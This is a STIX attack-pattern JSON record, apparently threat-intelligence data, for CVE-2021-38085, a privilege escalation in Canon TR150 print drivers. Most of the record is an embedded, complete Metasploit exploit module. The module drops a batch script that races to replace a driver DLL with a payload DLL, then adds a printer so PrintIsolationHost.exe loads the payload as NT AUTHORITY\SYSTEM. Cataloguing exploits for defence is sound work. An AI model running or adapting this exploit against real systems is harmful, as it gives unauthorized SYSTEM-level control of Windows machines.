{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--98649c26-e87c-4ee4-8c83-57bdf4e2adf6",
    "created": "2024-08-14T16:49:19.490156Z",
    "modified": "2024-08-14T16:49:19.490159Z",
    "name": "Canon Driver Privilege Escalation",
    "description": " Canon TR150 print drivers versions 3.71.2.10 and below allow local users to read/write files within the \"CanonBJ\" directory and its subdirectories. By overwriting the DLL at C:\\ProgramData\\CanonBJ\\IJPrinter\\CNMWINDOWS\\Canon TR150 series\\LanguageModules\\040C\\CNMurGE.dll with a malicious DLL at the right time whilst running the C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs script to install a new printer, a timing issue can be exploited to cause the PrintIsolationHost.exe program which runs as NT AUTHORITY\\SYSTEM, to successfully load the malicious DLL. Successful exploitation will grant attackers code execution as the NT AUTHORITY\\SYSTEM user.  This module leverages the prnmngr.vbs script to add and delete printers. Multiple runs of this module may be required given successful exploitation is time-sensitive.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/canon_driver_privesc.rb",
            "external_id": "canon_driver_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-38085"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Canon Driver Privilege Escalation',\n        'Description' => %q{\n          Canon TR150 print drivers versions 3.71.2.10 and below allow local users to read/write files\n          within the \"CanonBJ\" directory and its subdirectories. By overwriting the DLL at\n          C:\\ProgramData\\CanonBJ\\IJPrinter\\CNMWINDOWS\\Canon TR150 series\\LanguageModules\\040C\\CNMurGE.dll\n          with a malicious DLL at the right time whilst running the C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs\n          script to install a new printer, a timing issue can be exploited to cause the PrintIsolationHost.exe program,\n          which runs as NT AUTHORITY\\SYSTEM, to successfully load the malicious DLL. Successful exploitation\n          will grant attackers code execution as the NT AUTHORITY\\SYSTEM user.\n\n          This module leverages the prnmngr.vbs script\n          to add and delete printers. Multiple runs of this\n          module may be required given successful exploitation\n          is time-sensitive.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Jacob Baines', # discovery, PoC, module\n          'Shelby Pace' # original Ricoh module\n        ],\n        'References' => [\n          ['CVE', '2021-38085'],\n        ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [\n            'Windows', { 'Arch' => [ ARCH_X86, ARCH_X64 ] }\n          ]\n        ],\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK ],\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'Stability' => [ SERVICE_RESOURCE_LOSS ]\n        },\n        'DisclosureDate' => '2021-08-07',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    @driver_path = ''\n    dir_name = 'C:\\\\ProgramData\\\\CanonBJ\\\\IJPrinter\\\\CNMWINDOWS\\\\Canon TR150 series'\n\n    return CheckCode::Safe('No Canon TR150 driver directory found') unless directory?(dir_name)\n\n    language_dirs = dir(dir_name)\n\n    return CheckCode::Detected(\"Detected Canon driver directory, but no language files. Its likely the driver is installed but a printer hasn't been added yet\") unless language_dirs.length\n\n    @driver_path = dir_name\n    @driver_path.concat('\\\\LanguageModules\\\\040C')\n    res = cmd_exec(\"icacls \\\"#{@driver_path}\\\"\")\n    vulnerable = res.match(/\\\\Users:(?:\\(I\\))?\\(OI\\)\\(CI\\)\\(F\\)/)\n\n    return CheckCode::Safe(\"#{@driver_path} directory does not exist or does not grant Users full permissions\") unless vulnerable\n\n    vprint_status(\"Vulnerable language driver directory: #{@driver_path}\")\n    CheckCode::Appears('Canon language driver directory grants Users full permissions')\n  end\n\n  def add_printer(driver_name)\n    fail_with(Failure::NotFound, 'Printer driver script not found') unless file?(@script_path)\n\n    dll_data = generate_payload_dll\n    dll_path = \"#{@driver_path}\\\\CNMurGE.dll\"\n\n    temp_path = expand_path('%TEMP%\\\\CNMurGE.dll')\n\n    bat_file_path = expand_path(\"%TEMP%\\\\#{Rex::Text.rand_text_alpha(5..9)}.bat\")\n    cp_cmd = \"copy /y \\\"#{temp_path}\\\" \\\"#{dll_path}\\\"\"\n\n    # this script monitors the target dll for modification and then copies\n    # over our malicious dll. As this is a time based attack, it won't\n    # always be succuessful!\n    bat_file = <<~HEREDOC\n      attrib -a \"#{dll_path}\"\n      :repeat\n      for %%i in (\"#{dll_path}\") do echo %%~ai | find \"a\" >nul || goto :repeat\n      timeout /t 1\n      #{cp_cmd}\n      attrib -a \"#{dll_path}\"\n    HEREDOC\n\n    print_status(\"Dropping batch script to #{bat_file_path}\")\n    write_file(bat_file_path, bat_file)\n\n    print_status(\"Writing DLL file to #{temp_path}\")\n    write_file(temp_path, dll_data)\n    register_files_for_cleanup(bat_file_path, temp_path)\n\n    script_cmd = \"cscript \\\"#{@script_path}\\\" -a -p \\\"#{@printer_name}\\\" -m \\\"#{driver_name}\\\" -r \\\"lpt1:\\\"\"\n    bat_cmd = \"cmd.exe /c \\\"#{bat_file_path}\\\"\"\n    vprint_status('Executing the batch script...')\n    client.sys.process.execute(bat_cmd, nil, { 'Hidden' => true })\n\n    print_status(\"Adding printer #{@printer_name}...\")\n    cmd_exec(script_cmd)\n  rescue Rex::Post::Meterpreter::RequestError => e\n    fail_with(Failure::Unknown, \"#{e.class} #{e.message}\")\n  end\n\n  def exploit\n    fail_with(Failure::None, 'Already running as SYSTEM') if is_system?\n\n    fail_with(Failure::None, 'Must have a Meterpreter session to run this module') unless session.type == 'meterpreter'\n\n    if sysinfo['Architecture'] != payload.arch.first\n      fail_with(Failure::BadConfig, 'The payload should use the same architecture as the target machine')\n    end\n\n    @printer_name = Rex::Text.rand_text_alpha(5..9)\n    @script_path = 'C:\\\\Windows\\\\System32\\\\Printing_Admin_Scripts\\\\en-US\\\\prnmngr.vbs'\n    drvr_name = 'Canon TR150 series'\n\n    add_printer(drvr_name)\n  end\n\n  def cleanup\n    print_status(\"Deleting printer #{@printer_name}\")\n    sleep(3)\n    delete_cmd = \"cscript \\\"#{@script_path}\\\" -d -p \\\"#{@printer_name}\\\"\"\n    client.sys.process.execute(delete_cmd, nil, { 'Hidden' => true })\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-08-07",
    "x_mitre_platforms": [
        "win'"
    ]
}